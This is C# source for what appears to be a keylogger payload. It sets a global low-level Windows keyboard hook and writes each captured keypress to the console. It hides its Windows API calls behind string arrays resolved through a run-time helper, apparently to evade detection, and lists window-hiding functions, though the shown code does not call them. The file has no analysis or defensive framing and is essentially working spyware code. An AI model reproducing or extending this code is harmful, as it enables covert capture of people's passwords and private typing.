using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KernelKeycastPayload
{
    public class NativeMethods
    {
        public static readonly LowLevelKeyboardProc _proc = HookCallback;
        private static string[] _dllNames = { "user32", "kernel32" };
        public static IntPtr _hookerId = IntPtr.Zero;
        private static string[] _methodNames = { "UnhookWindowsHookEx", "GetModuleHandle", "SetWindowsHookEx", "CallNextHookEx", "GetConsoleWindow", "ShowWindow" };
        private const int WH_KEBOARD_LL = 13;
        private const int WH_KEYDOWN = 0x0100;

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public static IntPtr SetHook(LowLevelKeyboardProc proc)/*Action<int, IntPtr, IntPtr>*/
        {
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                var moduleHandle = Utilities.CallApi<IntPtr>(_dllNames[1], _methodNames[1], new Type[] { typeof(string) }, new object[] { curModule.ModuleName });
                return Utilities.CallApi<IntPtr>(_dllNames[0], _methodNames[2], new Type[] { typeof(int), typeof(LowLevelKeyboardProc), typeof(IntPtr), typeof(int) },
                    new object[] { WH_KEBOARD_LL, proc, moduleHandle, 0 });
            }
        }

        public static void SetHookerID()
        {
            Utilities.CallApi<bool>(_dllNames[0], _methodNames[0], new Type[] { typeof(IntPtr) }, new object[] { _hookerId });
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode < 0 || wParam != (IntPtr)WH_KEYDOWN)
                return Utilities.CallApi<IntPtr>(_dllNames[0], _methodNames[3],
new Type[] { typeof(IntPtr), typeof(int), typeof(IntPtr), typeof(IntPtr) }, new object[] { _hookerId, nCode, wParam, lParam });
            var vkCode = (Keys)Marshal.ReadInt32(lParam);

            foreach (Keys k in Enum.GetValues(typeof(Keys)))
            {
                if (vkCode.Equals(k))
                {
                    Console.WriteLine(" [ " + k + " ] ");
                }
            }

            return Utilities.CallApi<IntPtr>(_dllNames[0], _methodNames[3],
                new Type[] { typeof(IntPtr), typeof(int), typeof(IntPtr), typeof(IntPtr) }, new object[] { _hookerId, nCode, wParam, lParam });
        }
    }
}